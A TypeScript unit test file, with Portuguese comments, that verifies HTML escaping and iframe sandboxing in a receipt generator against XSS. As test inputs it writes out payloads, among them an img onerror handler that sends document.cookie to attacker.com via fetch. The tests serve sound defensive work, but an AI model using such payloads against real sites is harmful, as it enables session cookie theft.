/**
 * gerar-recibo-xss.test.ts
 * 
 * Testes unitários para comprovar a mitigação de XSS e injeção de HTML no recibo:
 * - Payloads maliciosos em nomes, descrições e cidades
 * - Neutralização de scripts, event handlers e tags HTML
 */
import { describe, it, expect } from "vitest";

function escapeHtml(str: unknown): string {
  return String(str ?? "")
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#039;");
}

describe("gerar-recibo — Sanitização e Mitigação de XSS", () => {
  it("Neutraliza tags <script>alert(1)</script>", () => {
    const maliciousInput = "<script>alert('XSS')</script>";
    const sanitized = escapeHtml(maliciousInput);

    expect(sanitized).not.toContain("<script>");
    expect(sanitized).not.toContain("</script>");
    expect(sanitized).toBe("&lt;script&gt;alert(&#039;XSS&#039;)&lt;/script&gt;");
  });

  it("Neutraliza event handlers em tags de imagem (onerror)", () => {
    const maliciousInput = '<img src="invalid" onerror="fetch(\'https://attacker.com/steal?c=\' + document.cookie)">';
    const sanitized = escapeHtml(maliciousInput);

    expect(sanitized).not.toContain("<img");
    expect(sanitized).toContain("&lt;img");
    expect(sanitized).toContain("&quot;");
  });

  it("Neutraliza injeção em atributos com aspas duplas e simples", () => {
    const maliciousInput = '" onmouseover="alert(1)" data-x=\'injection\'';
    const sanitized = escapeHtml(maliciousInput);

    expect(sanitized).not.toContain('"');
    expect(sanitized).not.toContain("'");
    expect(sanitized).toBe("&quot; onmouseover=&quot;alert(1)&quot; data-x=&#039;injection&#039;");
  });

  it("Manipula graciosamente valores nulos ou indefinidos sem quebrar", () => {
    expect(escapeHtml(null)).toBe("");
    expect(escapeHtml(undefined)).toBe("");
    expect(escapeHtml(12345)).toBe("12345");
  });

  it("Garante que Recibos.tsx usa sandbox com allow-modals e allow-same-origin SEM allow-scripts", async () => {
    const fs = await import("fs");
    const path = await import("path");
    const recibosPath = path.resolve(process.cwd(), "src/pages/Recibos.tsx");
    const code = fs.readFileSync(recibosPath, "utf-8");

    expect(code).toContain('sandbox="allow-modals allow-same-origin"');
    // Crucial: allow-scripts NUNCA pode ser incluído no sandbox do preview
    expect(code).not.toContain("allow-scripts");
  });
});
